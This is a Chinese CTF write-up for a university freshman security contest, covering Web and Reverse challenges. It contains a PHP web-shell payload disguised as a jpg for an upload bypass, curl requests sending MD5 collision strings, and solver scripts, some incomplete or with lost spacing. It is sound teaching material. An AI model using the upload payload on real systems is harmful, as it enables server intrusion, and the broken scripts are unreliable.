---
title: 齐鲁师范学院2025级网络安全新生技能竞赛 WriteUP
url: https://mp.weixin.qq.com/s/yVXaLnxyQXHZ3cZCPN3xtA
source: Doonsec's feed
date: 2026-01-11
fetch_date: 2026-01-12T03:36:02.604588
---

# 齐鲁师范学院2025级网络安全新生技能竞赛 WriteUP

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwRKTzxAJibbtnV1eZe5yxyBQgnO3XwScCibT0tGjAhAibuiby0KE0ibxlkrg/0?wx_fmt=jpeg)

# 齐鲁师范学院2025级网络安全新生技能竞赛 WriteUP

原创

小志z

志在片语

![]()

在小说阅读器中沉浸阅读

# 齐鲁师范学院2025级网络安全新生技能竞赛 WriteUP

> 这次比赛Web和Pwn都差一道题没做出来（自己还是太菜了 但是整体还可以 侥幸拿了一个第一 这个WP大部分的一把嗦（脚本可能又臭又长） 但是部分题还是有参考价值的（（（
>
> ![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdww52gg00u5mKXax194MWtLyYx4FQlXs6oeiapIfuc2juiajcksPib18bqg/640?wx_fmt=png&from=appmsg)

## Web

### **贪吃蛇**

```
题目信息 - 贪吃蛇
出题人: AireSein | 难度： 简单

贪吃蛇小游戏，你能达到100000分吗
```

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwXWTcQ7cH7a9xnxqawMl1ypdMTvbdmUic7eibUfaj24xUCZh1icg767Mxw/640?wx_fmt=png&from=appmsg)

很简单的一道题 看js文件 然后发现发POST包就行了

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwhL83XS0bibdDlbMWTKoUa7NuYTXhhl573RYeqesqdicHVllCCr4aDsow/640?wx_fmt=png&from=appmsg)

### **比签到难点点**

```
题目信息 - 比签到难点点
出题人： Ord1nary | 难度： 简单

你拿到了一个看似“正常”的网站...
但很显然，管理员不会光明正大地把东西放在首页，对吗？

尝试逐步对敏感目录进行逐级扫描，找到最终的文件
```

dirsearch即可

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwNpZUdY2Mia8rVagksibM3BSEHzcJnKbsE8eJLURltt8vLv1kekoib2aWQ/640?wx_fmt=png&from=appmsg)

getflag

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwZA5wPVqcHQ4EaYicHuV82yTmXnXvrE3EADQm2lNpTyDXOhpmRQd7Liag/640?wx_fmt=png&from=appmsg)

### **md5-boss**

```
题目信息 - md5-boss
出题人： Ord1nary | 难度： 中等

只有完美相等却又不一样的两个人，才能进入真正的核心世界
```

这道题在网上找的强比较字符串 curl发送即可

```
curl -X POST "http://challenge.snige.cn:22027/" \
 -d "admin=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2" \
 -d "password=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2"
```

### **ez\_upload**

```
题目信息 - ez_upload
出题人： Ord1nary | 难度： 中等

你误入了“黑客帝国邮箱”。
这玩意号称绝对安全：
——“只允许上传图片，不可能被入侵！”
等等...怎么不对劲……我得尝试一下！
看来管理员对安全的理解，可能只停留在“jpg ≠ 木马”这个水平。
那就试试，用合理的方式上传一份不一样的文件，让系统告诉你答案吧
```

构建恶意jpg文件

```
<?system("cat /flag");?>
```

上传即可

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwnhKy0S0xzNhNFqG5ymuwRqUIGicQAb8g7gh0hA6k61ibTJxUEJ4YZOVQ/640?wx_fmt=png&from=appmsg)

然后打开对应url getflag

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwmy8puOicsnwpUIpiazaFzZ2gaq69piaE0JeKBb2Bjh0JtmLrMS10TN3cw/640?wx_fmt=png&from=appmsg)

## Reverse

### **欢迎**

```
题目信息 - 欢迎
出题人： Rxlls | 难度： 简单

无描述
```

这个打开IDA就能找到

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwibPQlGRBhCLxdKib2GnHnfzHfvuzU8ApciccmafEvt89DiaXjIDPAictjPw/640?wx_fmt=png&from=appmsg)

### **也没啥**

```
题目信息 - 也没啥
出题人： Duktig | 难度： 简单

真的没啥，很简单的
```

很简单的一把嗦

```
import random

cipher = [214, 23, 219, 82, 148,
          138, 135, 181, 42, 136,
          176, 80, 225, 112, 199,
          14, 21, 221, 118, 228, 229]

random.seed(1)
l = [random.getrandbits(8) for _ in range(5)]

key_stream = []
for seed in l:
    random.seed(seed)
    key_stream += [random.getrandbits(8) for _ in range(5)]

flag = ''.join(chr(c ^ k) for c, k in zip(cipher, key_stream))
print(flag)
```

### **加密**

```
题目信息 - 加密
出题人： Rxlls | 难度： 中等

无描述
```

这道题没看出来有多难（

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwx4W4vZiapia5gtwLpESR5r2Y1YW70Aia4DqQrgzncCvVAZfD5wfARKajg/640?wx_fmt=png&from=appmsg)

base64解码

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwTGoR8CqpmIicQIFshrStSGuFKfddk2CYVXcq4UC2u7QHePWp0ibwPIfQ/640?wx_fmt=png&from=appmsg)

### **PACKAGE**

```
题目信息 - PACKAGE
出题人： Camille | 难度： 中等

程序使用了PyInstaller牌包装袋进行打包。
密码长度: 9个字符
包含子串: "qlctf"
祝你好运！
```

先解包

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdw0J3mfUAP6r9f2nowgTMfbzEljevYGVoKqAT8dDxAPiao2TKrt7sMHyA/640?wx_fmt=png&from=appmsg)

再解pyc

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdw1CBPowTBkWaaeFKpCfkX1TiahI87wjq1giamnhibsE5ITibdgF77DU3Hgw/640?wx_fmt=png&from=appmsg)

最后md5碰撞

```
import hashlib
import itertools
import string

target_hash = "cf6988b80c3d9712d6e2ff87a98caf26"

# 已知包含 "qlctf"，尝试不同位置
base = "qlctf"
for i in range(5):  # 4个额外字符的位置
    for extra in itertools.product(string.printable, repeat=4):
        if i == 0:
            password = base + ''.join(extra)
        elif i == 1:
            password = extra[0] + base + ''.join(extra[1:])
        # ... 等等

        if hashlib.md5(password.encode()).hexdigest() == target_hash:
            print(f"Found: {password}")
            break
```

结果如下

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwos7Ewh57UZnCjGZFtwLnXmVR3yBZsFaC0G0FepB6XOt6yRWngnwAoQ/640?wx_fmt=png&from=appmsg)

Getflag

![](https://mmbiz.qpic.cn/mmbiz_png/9sGuXCD0aGx7aRL08wIRR8WEPfSzGRdwV5AeO2usYsXmdVGCKIAfznknYX43qjbPV4MMsGuHOibQCBs6ISUF6Zg/640?wx_fmt=png&from=appmsg)

### **迷宫**

```
题目信息 - 迷宫
出题人： Rxlls | 难度： 困难

提示：

键盘按键wsad代表上下左右路径
题目的Flag内容为小写字母
```

打开IDA看代码逻辑

```
int start_challenge()
{
  char *v0; // rsi
  unsigned int v1; // edi
  char *v2; // rbx
  __int64 v3; // rdx
  size_t v4; // rax
  size_t v5; // r13
  char *v6; // r14
  int v7; // ebx
  char *v8; // rbp
  int v9; // r15d
  int v10; // eax
  char Str[200]; // [rsp+20h] [rbp-C8h] BYREF

  v0 = &maze[16];
  v1 = 0;
  system("cls");
  puts("--- 迷宫地图已加载 ---");
do
  {
    v2 = v0 - 16;
    printf("Row %d: ", v1);
    do
    {
      v3 = (unsigned int)*v2++;
      printf("%c ", v3);
    }
    while ( v2 != v0 );
    ++v1;
    v0 = v2 + 17;
    putchar(10);
  }
while ( v1 != 10 );
printf(asc_140004469);
  scanf("%127s", Str);
  v4 = strlen(Str);
  v5 = v4;
if ( !v4 )
  {
LABEL_15:
    system("cls");
    return puts(asc_140004556);
  }
  v6 = Str;
  v7 = 1;
  v8 = &Str[(unsigned int)(v4 - 1) + 1];
  v9 = 1;
do
  {
    v10 = tolower(*v6);
    switch ( v10 )
    {
      case'w':
        if ( (unsigned int)--v9 > 9 )
          goto LABEL_15;
        break;
      case's':
        if ( ++v9 == 10 )
          goto LABEL_15;
        break;
      case'a':
        if ( v7-- == 0 )
          goto LABEL_15;
        break;
      case'd':
        if ( ++v7 == 16 )
          goto LABEL_15;
        break;
      default:
        goto LABEL_15;
    }
    if ( maze[17 * v9 + v7] == 49 )
      goto LABEL_15;
    ++v6;
  }
while ( v6 != v8 );
  system("cls");
if ( v9 != 8 || v7 != 14 || v5 != 24 )
    return puts(asc_140004556);
  puts("\n\n--------------------------------------------");
  puts(asc_1400044B8);
  puts("--------------------------------------------");
  puts("\n你的Flag是:");
printf("QLNUCTF{%s}\n", Str);
return puts("\n--------------------------------------------");
}
```

用Python一把嗦脚本

```
from collections import deque

# 根据输出的迷宫重建
# 注意：我们看到的输出中，字符之间有空格，但实际存储的没有空格
maze_lines = [
    "1111111111111111",
    "1#01000100000011",
    "1101110101101011",
    "1100010001001011",
    "1111011101100011",
    "1100000100001111",
    "1111101101100111",
    "1100000000100011",
    "11000000001010@1",
    "1111111111111111"
]

# 将#和@替换为0（都是通路）
maze = []
for line in maze_lines:
    maze.append(line.replace('#', '0').replace('@', '0'))

# 打印迷宫确认
print("迷宫地图（0=通路，1=墙）:")
for i, row in enumerate(maze):
    print(f"Row {i}: {' '.join(list(row))}")

# 起始位置和目标位置（根据代码）
# 代码中v9从1开始，v7从1开始
# 目标：v9=8, v7=14, v5=24
start = (1, 1)  # (row, col)
end = (8, 14)   # (row, col)
exact_steps = 24

# 方向映射
dirs = {
    'w': (-1, 0),  # 上
    's': (1, 0),   # 下
    'a': (0, -1),  # 左
    'd': (0, 1)    # 右
}

# 边界检查函数（完全模拟原程序）
def check_move(row, col, move):
    """模拟原程序的边界检查，返回新的位置和是否有效"""
    new_row, new_col = row, col

    if move == 'w':
        new_row -= 1
        # if ((unsigned int)--v9 > 9) 当v9-1为负数时，无符号数会很大
        if new_row < 0or new_row > 9:
            returnNone, False

    elif move == 's':
        new_row += 1
        # if (++v9 == 10)
        if new_row == 10:
            returnNone, False

    elif move == 'a':
        # if (v7-- == 0) - 先检查v7是否为0，然后v7减1
        if col ==...